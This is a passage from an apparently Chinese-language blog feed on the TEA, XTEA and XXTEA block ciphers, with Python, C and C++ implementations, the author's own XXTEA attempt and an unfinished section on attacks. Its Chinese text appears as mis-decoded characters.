class="number">1</span>])</span><br><span class="line">y += ((x &lt;&lt; <span class="number">4</span>) + Key[<span class="number">2</span>]) ^ (x + delta) ^ ((x &gt;&gt; <span class="number">5</span>) + Key[<span class="number">3</span>])</span><br></pre></td></tr></table></figure><p>æ³¨ï¼šå…·ä½“ç®—æ³•å¯èƒ½ä¸åŒï¼Œä½†æ˜¯ä¸€èˆ¬éƒ½æ˜¯x ç”±yå’Œkeyæ”¹å˜ï¼Œyç”±xå’Œkeyæ”¹å˜ï¼Œdeltaå¯èƒ½åŠ å¯èƒ½å‡,ä½†æ˜¯ä¸€èˆ¬æƒ…å†µä¸ä¼šæŠŠfor i in (0,len(m),2)æ”¹æˆfor i in (len-1)ï¼Œè¿™æ ·å°±ä¸æ˜¯å—åŠ å¯†äº†</p><p>æ­¤å¤„çœç•¥äº†&amp;0xffffffffï¼Œéœ€è¦è®©æ‰€æœ‰å€¼éƒ½æ˜¯int/dwordï¼Œä¸‹é¢ä¹Ÿæ˜¯ï¼Œä¹‹åä¸è¯´äº†</p><hr><p>XTEAçš„åŠ å¯†éƒ¨åˆ†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">    x += (((y &lt;&lt; <span class="number">4</span>) ^ (y &gt;&gt; <span class="number">5</span>)) + y) ^ (delta + key[delta &amp; <span class="number">3</span>])</span><br><span class="line">    delta++</span><br><span class="line">    y += (((x &lt;&lt; <span class="number">4</span>) ^ (x &gt;&gt; <span class="number">5</span>)) + x) ^ (delta + key[(delta&gt;&gt;<span class="number">11</span>) &amp; <span class="number">3</span>])</span><br></pre></td></tr></table></figure><p>æ³¨ï¼›ç›¸å½“äºæ·»åŠ äº†ä¸å’Œä½ç§»,è®©keyçš„å–å€¼ä¸å›ºå®š,ä½†æ˜¯æ¡†æ¶æ²¡å•¥åŒºåˆ«</p><hr><p>XXTEAçš„åŠ å¯†éƒ¨åˆ†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">round</span> = <span class="number">6</span> + <span class="number">52</span> // n <span class="comment">#nä¸ºæ•°æ®ä¸ªæ•°ï¼ˆè¾“å…¥æ•°ç»„é•¿åº¦ï¼‰,é•¿åº¦å¯ä»¥ä¸æ˜¯4çš„å€æ•°</span></span><br><span class="line">MX = <span class="keyword">lambda</span> <span class="built_in">sum</span>, y, z, p, e, k: ((z &gt;&gt; <span class="number">5</span> ^ y &lt;&lt; <span class="number">2</span>) + (y &gt;&gt; <span class="number">3</span> ^ z &lt;&lt; <span class="number">4</span>)) ^ ((<span class="built_in">sum</span> ^ y) + (k[p &amp; <span class="number">3</span> ^ e] ^ z))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="built_in">round</span>):</span><br><span class="line"><span class="built_in">sum</span> = (<span class="built_in">sum</span> + DELTA) &amp; <span class="number">0xffffffff</span></span><br><span class="line">e = <span class="built_in">sum</span> &gt;&gt; <span class="number">2</span> &amp; <span class="number">3</span></span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">y = m[(p + <span class="number">1</span>) % n]</span><br><span class="line">z = m[p] = (m[p] + MX(<span class="built_in">sum</span>, y, z, p, e, k)) &amp; <span class="number">0xffffffff</span></span><br></pre></td></tr></table></figure><p>è´´ä¸€ä¸ªcè¯­è¨€ç‰ˆ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ä¹Ÿä¸çŸ¥é“ç½‘ä¸Šéƒ½å†™çš„å•¥ï¼Œçœ‹éƒ½çœ‹ä¸æ‡‚//ç»ˆäºçœ‹æ‡‚äº†ï¼Œå¥½è€¶</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 0x9e3779b9</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MX (((z&gt;&gt;5^y<span class="string">&lt;&lt;2) + (y&gt;</span>&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">xxtea</span><span class="params">(<span class="type">uint32_t</span>* v, <span class="type">int</span> n, <span class="type">uint32_t</span>* key)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint32_t</span> y, z, sum;</span><br><span class="line">    <span class="type">unsigned</span> p, rounds, e;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="number">1</span>)             <span class="comment">// encrypt</span></span><br><span class="line">    &#123;</span><br><span class="line">        rounds = <span class="number">6</span> + <span class="number">52</span>/n;</span><br><span class="line">        sum = <span class="number">0</span>;</span><br><span class="line">        z = v[n<span class="number">-1</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            sum += DELTA;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p=<span class="number">0</span>; p&lt;n<span class="number">-1</span>; p++)</span><br><span class="line">            &#123;</span><br><span class="line">                y = v[p+<span class="number">1</span>];</span><br><span class="line">                z = v[p] += MX;</span><br><span class="line">            &#125;</span><br><span class="line">            y = v[<span class="number">0</span>];</span><br><span class="line">            z = v[n<span class="number">-1</span>] += MX;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (n &lt; <span class="number">-1</span>)      <span class="comment">// decrypt</span></span><br><span class="line">    &#123;</span><br><span class="line">        n = -n;</span><br><span class="line">        rounds = <span class="number">6</span> + <span class="number">52</span>/n;</span><br><span class="line">        sum = rounds * DELTA;</span><br><span class="line">        y = v[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p=n<span class="number">-1</span>; p&gt;<span class="number">0</span>; p--)</span><br><span class="line">            &#123;</span><br><span class="line">                z = v[p<span class="number">-1</span>];</span><br><span class="line">                y = v[p] -= MX;</span><br><span class="line">            &#125;</span><br><span class="line">            z = v[n<span class="number">-1</span>];</span><br><span class="line">            y = v[<span class="number">0</span>] -= MX;</span><br><span class="line">            sum -= DELTA;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// test</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// ä¸¤ä¸ª32ä½æ— ç¬¦å·æ•´æ•°ï¼Œå³å¾…åŠ å¯†çš„64bitæ˜æ–‡æ•°æ®</span></span><br><span class="line">    <span class="type">uint32_t</span> v[<span class="number">2</span>] = &#123;<span class="number">0x12345678</span>, <span class="number">0x78563412</span>&#125;;</span><br><span class="line">    <span class="comment">// å››ä¸ª32ä½æ— ç¬¦å·æ•´æ•°ï¼Œå³128bitçš„key</span></span><br><span class="line">    <span class="type">uint32_t</span> k[<span class="number">4</span>]= &#123;<span class="number">0x1</span>, <span class="number">0x2</span>, <span class="number">0x3</span>, <span class="number">0x4</span>&#125;;</span><br><span class="line">    <span class="comment">//nçš„ç»å¯¹å€¼è¡¨ç¤ºvçš„é•¿åº¦ï¼Œå–æ­£è¡¨ç¤ºåŠ å¯†ï¼Œå–è´Ÿè¡¨ç¤ºè§£å¯†</span></span><br><span class="line">    <span class="type">int</span> n = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Data is : %x %x\n&quot;</span>, v[<span class="number">0</span>], v[<span class="number">1</span>]);</span><br><span class="line">    xxtea(v, n, k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Encrypted data is : %x %x\n&quot;</span>, v[<span class="number">0</span>], v[<span class="number">1</span>]);</span><br><span class="line">    xxtea(v, -n, k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Decrypted data is : %x %x\n&quot;</span>, v[<span class="number">0</span>], v[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¿®æ­£ï¼šXXTEAå’Œå‰é¢ä¸¤ä¸ªçš„åŒºåˆ«åœ¨äºï¼š</p><p>å‰ä¸¤ä¸ªåŠ å¯†åªæ˜¯ä¸¤ä¸ªä¸¤ä¸ªåœ°ç›¸äº’åŠ å¯†ï¼Œä½†æ˜¯xxteaæ˜¯ç”¨å‰ä¸€ä¸ªå€¼å’Œåä¸€ä¸ªå€¼åŠ å¯†è¿™ä¸ªä½ï¼ŒæŒ‰æ¯ä¸ªéƒ½åŠ å¯†ä¸€éç®—ä¸€è½®ï¼Œä¸€å…±è¿›è¡Œroundè½®,è¿™é‡Œæ”¾ä¸€ä¸ªæˆ‘ç†è§£çš„XXTEAï¼Œæ ¹æ®ç½‘ä¸Šçš„æµ‹è¯•ï¼Œéƒ½æ˜¯ä¸€æ ·çš„ï¼Œä½†æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆå¦‚æœç”¨æˆ‘çš„æµ‹è¯•æ ·ä¾‹å°±è¿‡ä¸äº†ï¼ˆç½‘ä¸Šçš„ç‰ˆæœ¬ä¼šå¤±æ•ˆï¼‰</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//main.cpp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Arr.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">XXTEA</span><span class="params">(Arr&amp; input, <span class="type">uint32_t</span>* <span class="type">const</span> key)</span> </span>&#123;</span><br><span class="line"><span class="type">uint32_t</span> delta = <span class="number">0x9E3779B9</span>;</span><br><span class="line"><span class="type">uint32_t</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="type">uint32_t</span> len = input.<span class="built_in">getsize</span>();</span><br><span class="line"><span class="type">uint32_t</span> round = <span class="number">52</span> / len + <span class="number">6</span>;</span><br><span class="line"><span class="comment">//åˆå§‹åŒ–</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; round; i++)</span><br><span class="line">&#123;</span><br><span class="line">sum += delta;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> now = <span class="number">0</span>; now &lt; len; now++)</span><br><span class="line">&#123;</span><br><span class="line">input[now] += (((input[now - <span class="number">1</span>] &gt;&gt; <span class="number">5</span> ^ input[now + <span class="number">1</span>] &lt;&lt; <span class="number">2</span>) +</span><br><span class="line">(input[now + <span class="number">1</span>] &gt;&gt; <span class="number">3</span> ^ input[now - <span class="number">1</span>] &lt;&lt; <span class="number">4</span>)) ^ ((sum ^ input[now + <span class="number">1</span>]) +</span><br><span class="line">(key[(now &amp; <span class="number">3</span>) ^ ((sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>)] ^ input[now - <span class="number">1</span>])));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">deXXTEA</span><span class="params">(Arr&amp; input, <span class="type">uint32_t</span>* <span class="type">const</span> key)</span> </span>&#123;</span><br><span class="line"><span class="type">uint32_t</span> delta = <span class="number">0x9E3779B9</span>;</span><br><span class="line"><span class="type">uint32_t</span> len = input.<span class="built_in">getsize</span>();</span><br><span class="line"><span class="type">uint32_t</span> round = <span class="number">52</span> / len + <span class="number">6</span>;</span><br><span class="line"><span class="type">uint32_t</span> sum = delta * round;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; round; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> now = len - <span class="number">1</span>; now &gt; <span class="number">-1</span>; now--)</span><br><span class="line">&#123;</span><br><span class="line">input[now] -= (((input[now - <span class="number">1</span>] &gt;&gt; <span class="number">5</span> ^ input[now + <span class="number">1</span>] &lt;&lt; <span class="number">2</span>) +</span><br><span class="line">(input[now + <span class="number">1</span>] &gt;&gt; <span class="number">3</span> ^ input[now - <span class="number">1</span>] &lt;&lt; <span class="number">4</span>)) ^ ((sum ^ input[now + <span class="number">1</span>]) +</span><br><span class="line">(key[(now &amp; <span class="number">3</span>) ^ ((sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>)] ^ input[now - <span class="number">1</span>])));</span><br><span class="line">&#125;</span><br><span class="line">sum -= delta;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"><span class="comment">//Arr test = &#123; 0x1234,0x5678,0x7777,0xbead &#125;;</span></span><br><span class="line">Arr* test = <span class="keyword">new</span> <span class="built_in">Arr</span>((<span class="type">uint32_t</span>*)<span class="string">&quot;HELLO_MESSAGE_he&quot;</span>, <span class="number">4</span>);<span class="comment">//XXTEAè¦æ±‚å¿…é¡»æ˜¯4çš„å€æ•°</span></span><br><span class="line"><span class="comment">//Arr test = &#123; 1,2 &#125;;</span></span><br><span class="line"><span class="type">uint32_t</span> <span class="type">const</span> key[<span class="number">4</span>] = &#123; <span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">XXTEA</span>(*test, (<span class="type">uint32_t</span>*)key);</span><br><span class="line">std::cout &lt;&lt; *test;</span><br><span class="line"><span class="built_in">deXXTEA</span>(*test, (<span class="type">uint32_t</span>*)key);</span><br><span class="line">std::cout &lt;&lt; *test;</span><br><span class="line">std::cout &lt;&lt; (<span class="type">char</span>*)test-&gt;<span class="built_in">getarr</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Arr.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;initializer_list&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Arr</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">size_t</span> size;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>* arr;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">Arr</span>(<span class="type">size_t</span> s);</span><br><span class="line"><span class="built_in">Arr</span>(<span class="type">uint32_t</span>* p, <span class="type">unsigned</span> s);</span><br><span class="line"><span class="built_in">Arr</span>(std::initializer_list&lt;<span class="type">unsigned</span> <span class="type">int</span>&gt; init);</span><br><span class="line">~<span class="built_in">Arr</span>();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> <span class="title">getsize</span><span class="params">()</span> <span class="type">const</span></span>;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span>* <span class="title">getarr</span><span class="params">()</span> <span class="type">const</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">friend</span> std::ostream&amp; <span class="keyword">operator</span>&lt;&lt;(std::ostream&amp; os, <span class="type">const</span> Arr&amp; obj);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>&amp; <span class="keyword">operator</span>[](<span class="type">unsigned</span> i);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span>* <span class="title">begin</span><span class="params">()</span> <span class="type">const</span></span>;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span>* <span class="title">end</span><span class="params">()</span> <span class="type">const</span></span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Arr.cpp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Arr.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">Arr::<span class="built_in">Arr</span>(<span class="type">size_t</span> s) : <span class="built_in">size</span>(s), <span class="built_in">arr</span>(<span class="keyword">new</span> <span class="type">uint32_t</span>[s]) &#123;</span><br><span class="line">std::<span class="built_in">fill_n</span>(arr, s, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Arr::<span class="built_in">Arr</span>(<span class="type">uint32_t</span>* p, <span class="type">unsigned</span> s) : <span class="built_in">Arr</span>(s)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">&#123;</span><br><span class="line">arr[i] = p[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Arr::<span class="built_in">Arr</span>(std::initializer_list&lt;<span class="type">unsigned</span> <span class="type">int</span>&gt; init) :<span class="built_in">size</span>(init.<span class="built_in">size</span>()), <span class="built_in">arr</span>(<span class="keyword">new</span> <span class="type">unsigned</span> <span class="type">int</span>[init.<span class="built_in">size</span>()])</span><br><span class="line">&#123;</span><br><span class="line">std::<span class="built_in">copy</span>(init.<span class="built_in">begin</span>(), init.<span class="built_in">end</span>(), arr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Arr::~<span class="built_in">Arr</span>()</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">delete</span>[] arr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> <span class="title">Arr::getsize</span><span class="params">()</span> <span class="type">const</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span>* <span class="title">Arr::getarr</span><span class="params">()</span> <span class="type">const</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>&amp; Arr::<span class="keyword">operator</span>[](<span class="type">unsigned</span> i)</span><br><span class="line">&#123;</span><br><span class="line">i = (i + size) % size;</span><br><span class="line">i = i &gt;= <span class="number">0</span> ? i : (i + size);</span><br><span class="line"><span class="keyword">return</span> arr[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span>* <span class="title">Arr::begin</span><span class="params">()</span> <span class="type">const</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span>* <span class="title">Arr::end</span><span class="params">()</span> <span class="type">const</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> arr + size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">std::ostream&amp; <span class="keyword">operator</span>&lt;&lt;(std::ostream&amp; os, <span class="type">const</span> Arr&amp; obj)</span><br><span class="line">&#123;</span><br><span class="line">os &lt;&lt; <span class="string">&quot;len: &quot;</span> &lt;&lt; obj.<span class="built_in">getsize</span>() &lt;&lt; std::endl;</span><br><span class="line">os &lt;&lt; <span class="string">&quot;element list:&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">unsigned</span> i : obj) &#123;</span><br><span class="line">os &lt;&lt; <span class="string">&quot;0x&quot;</span> &lt;&lt; std::hex &lt;&lt; std::uppercase &lt;&lt; std::<span class="built_in">setw</span>(<span class="number">8</span>) &lt;&lt; std::<span class="built_in">setfill</span>(<span class="string">&#x27;0&#x27;</span>) &lt;&lt; i &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> os;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ç ´è§£æ–¹æ³•">ç ´è§£æ–¹æ³•</h2><h3 id="ç¼ºé™·">ç¼ºé™·</h3><p>ä¼¼ä¹ç½‘ä¸Šå¾ˆå¤šblogéƒ½æåˆ°äº†å¯†é’¥è¡¨æ”»å‡»TEAï¼Œä½†æ˜¯æˆ‘æ²¡æ‰¾åˆ°</p><p>[ç­‰å¾…æ–½å·¥][QAQ]</p>]]></content>
      
      
      <categories>
          
          <category> å¯†ç å­¦ </category>
          
          <category> ç®—æ³• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å¯¹ç§°åŠ å¯† </tag>
            
            <tag> å—åŠ å¯† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åŠ å¯†01:RC4</title>
      <link href="/posts/ed8aa7e2.html"/>
      <url>/posts/ed8aa7e2.html</url>
      
